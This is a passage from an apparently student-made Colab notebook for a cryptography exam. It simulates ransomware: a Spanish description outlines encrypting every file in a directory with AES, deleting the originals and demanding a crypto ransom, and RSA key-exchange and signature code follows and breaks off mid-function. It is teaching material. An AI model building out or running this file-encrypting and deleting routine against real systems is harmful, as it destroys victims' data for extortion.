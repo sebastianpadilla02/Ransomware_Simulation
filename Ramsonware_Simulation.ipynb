{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "![image.png](data:image/png;base64,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)\n"
      ],
      "metadata": {
        "id": "xUURzcq0bIMi"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Criptografia - Examen Final - Ramsonware Simulation\n",
        "2024-11-27\n",
        "\n",
        "\n",
        "*   Luis Espinel Código Est: 200149985\n",
        "*   Sebastián Arteta Código Est: 200166182\n",
        "*   Germán Centenaro Código Est: 200164183\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "_M9T2I8qb2IR"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Codigo: Ramsonware Simulado\n",
        "El ransomware simulado escanea un directorio en busca de archivos*, los cifra utilizando el cifrador AES en modo CBC y una llave simétrica derivada de un secreto común mediante HKDF con SHA-256. Los archivos cifrados se guardan con la extensión \".enc\", y los originales son eliminados para simular un ataque real. Al finalizar, el ransomware notifica a la víctima mostrando una lista de los archivos cifrados junto con una demanda de rescate en criptomonedas para recuperar el acceso a ellos.\n",
        "\n",
        "Una vez realizado el pago, el atacante proporciona las instrucciones para que la víctima regenere la llave simétrica utilizando el mismo secreto común y descifre los archivos. Esta simulación incluye prácticas reales de ransomware, como la generación de claves seguras y el uso de técnicas avanzadas de cifrado, pero sin implementar conexión real con un servidor externo ni propagación automatizada.\n",
        "\n",
        "**Nota*: El script recorre todos los archivos dentro de un directorio especificado (/content/ en Colab por defecto).**"
      ],
      "metadata": {
        "id": "OXC2QAGC0xq0"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install pycryptodome"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "yO2g1qgweO_S",
        "outputId": "2c390357-f28f-4256-c256-5dcc4badabae"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: pycryptodome in /usr/local/lib/python3.10/dist-packages (3.21.0)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## LIBRERIAS"
      ],
      "metadata": {
        "id": "2PhN8NUPu94x"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from Crypto.PublicKey import RSA\n",
        "from Crypto.Cipher import PKCS1_OAEP\n",
        "from Crypto.Signature import pkcs1_15\n",
        "from Crypto.Hash import SHA256\n",
        "import os\n",
        "\n",
        "from Crypto.Cipher import AES\n",
        "from Crypto.Util.Padding import pad, unpad\n",
        "from Crypto.Protocol.KDF import HKDF\n",
        "\n",
        "import base64"
      ],
      "metadata": {
        "id": "UQdzhQPJu6tV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Punto 2.\n",
        "Ambas partes compartirán un secreto común utilizando un protocolo de intercambio de llaves"
      ],
      "metadata": {
        "id": "mKUemwDvfTcI"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "--------------------------------------------------------------\n",
        "Llaves de corto plazo: Se generaron pares de llaves RSA de 2048 bits con la función generate_short_term_key.\n",
        "Estas llaves se utilizan exclusivamente para el intercambio temporal del secreto compartido.\n",
        "\n",
        "Protocolo AKE v.2: La víctima cifra el secreto compartido utilizando la llave pública de corto plazo del atacante, luego firma este secreto compartido.\n",
        "El atacante verifica la firma y luego descifra este secreto utilizando su llave privada de corto plazo.\n",
        "\n",
        "Separación de roles de las llaves: Las llaves de largo plazo (en los certificados) son solo para identificar y autenticar las partes.\n",
        "Las llaves de corto plazo se utilizan exclusivamente para cifrado y descifrado durante el intercambio del secreto.\n",
        "\n",
        "Información adicional: El secreto compartido es generado por la víctima y tiene un tamaño de 1024 bits.\n",
        "Las llaves públicas y privadas de corto plazo se utilizan en este flujo."
      ],
      "metadata": {
        "id": "rF2SSIAGlviJ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Tamaños y configuración\n",
        "RSA_KEY_SIZE = 2048\n",
        "K_SIZE = 1024  # Longitud del secreto compartido\n",
        "\n",
        "# Generar certificados (identidad y llave pública)\n",
        "def generate_certificate(identity):\n",
        "    key = RSA.generate(RSA_KEY_SIZE)\n",
        "    certificate = {\n",
        "        \"id\": identity,\n",
        "        \"pk\": key.publickey()\n",
        "    }\n",
        "    return certificate, key\n",
        "\n",
        "# Generar y firmar mensajes\n",
        "def sign_message(private_key, message):\n",
        "    h = SHA256.new(message)\n",
        "    signature = pkcs1_15.new(private_key).sign(h)\n",
        "    return signature\n",
        "\n",
        "# Verificar una firma\n",
        "def verify_signature(public_key, message, signature):\n",
        "    h = SHA256.new(message)\n",
        "    try:\n",
        "        pkcs1_15.new(public_key).verify(h, signature)\n",
        "        return True\n",
        "    except ValueError:\n",
        "        return False\n",
        "\n",
        "# Cifrado y descifrado asimétrico\n",
        "def encrypt_message(public_key, message):\n",
        "    cipher = PKCS1_OAEP.new(public_key)\n",
        "    return cipher.encrypt(message)\n",
        "\n",
        "def decrypt_message(private_key, ciphertext):\n",
        "    cipher = PKCS1_OAEP.new(private_key)\n",
        "    return cipher.decrypt(ciphertext)\n",
        "\n",
        "# Generar un par de llaves de corto plazo\n",
        "def generate_short_term_key():\n",
        "    return RSA.generate(RSA_KEY_SIZE)\n",
        "\n",
        "# Simular intercambio AKE v.2 con llaves de corto plazo\n",
        "def ake_v2_with_short_term_keys(attacker_cert, victim_cert, attacker_key, victim_key):\n",
        "    # Generar pares de llaves de corto plazo\n",
        "    attacker_short_term_key = generate_short_term_key()\n",
        "    victim_short_term_key = generate_short_term_key()\n",
        "\n",
        "    print(\"[INFO] Llaves de corto plazo generadas para ambas partes.\")\n",
        "\n",
        "    # Paso 1: Generar un secreto compartido aleatorio\n",
        "    shared_secret = os.urandom(K_SIZE // 8)\n",
        "    print(\"[INFO] Secreto compartido generado por la víctima:\", shared_secret.hex())\n",
        "\n",
        "    # Paso 2: La víctima cifra el secreto con la llave pública de corto plazo del atacante\n",
        "    encrypted_secret = encrypt_message(attacker_short_term_key.publickey(), shared_secret)\n",
        "    print(\"[INFO] Secreto cifrado enviado al atacante.\")\n",
        "\n",
        "    # Paso 3: La víctima firma el secreto compartido\n",
        "    signature = sign_message(victim_key, shared_secret)\n",
